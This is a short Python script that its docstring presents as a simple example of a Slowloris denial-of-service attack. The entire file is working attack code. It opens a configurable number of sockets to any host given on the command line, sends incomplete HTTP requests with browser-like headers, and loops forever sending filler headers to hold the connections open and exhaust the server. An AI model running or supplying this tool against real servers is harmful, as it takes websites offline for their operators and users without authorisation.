#! /usr/bin/env python
"""
Simple example of Slow Loris DoS Attack.

Author: Marco Antônio
"""

import socket
import random
import time
import sys

log_level = 2

def log(text, level=1):
    if log_level >= level:
        print(text)

list_of_sockets = []

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Accept-language: en-US,en,q=0.5",
]

def init_socket(ip_addr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip_addr, 80))

    try:
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('utf-8'))
        for header in regular_headers:
            s.send("{}\r\n".format(header).encode("utf-8"))
        # s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('utf-8'))
    except socket.error as err:
        log(err, level=2)
    return s

def main():
    if len(sys.argv) not in range(2,5):
        print("Usage: {} example.com [num_attackers(default: 200)] [log_level(default: 2)]".format(sys.argv[0]))
        return
    ip_addr = sys.argv[1]
    socket_count = 200
    try:
        global log_level
        socket_count = int(sys.argv[2])
        log_level = int(sys.argv[3])
    except IndexError as err:
        print(err)

    log("Attacking {} with {} sockets".format(ip_addr, socket_count))
    log("Creating sockets...")
    for _ in range(socket_count):
        try:
            log("Creating socket nr {}".format(_), level=2)
            s = init_socket(ip_addr)
        except socket.error as err:
            log(err, level=2)
            break
        list_of_sockets.append(s)

    while True:
        log("Sending keep-alive headers... Socket count: {}".format(len(list_of_sockets)))
        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('utf-8'))
            except socket.error as err:
                log(err, level=2)
                list_of_sockets.remove(s)
        log("Keep-alive sent! Socket count: {}".format(len(list_of_sockets)))

        diff = socket_count - len(list_of_sockets)
        log("Recreating {} sockets...".format(diff))
        for _ in range(diff):
            log("Recreating socket {} of {}...".format(_,diff), level=2)
            try:
                s = init_socket(ip_addr)
                if s:
                    list_of_sockets.append(s)
            except socket.error as err:
                log(err, level=2)
                break
        time.sleep(15)

if __name__ == "__main__":
    main()
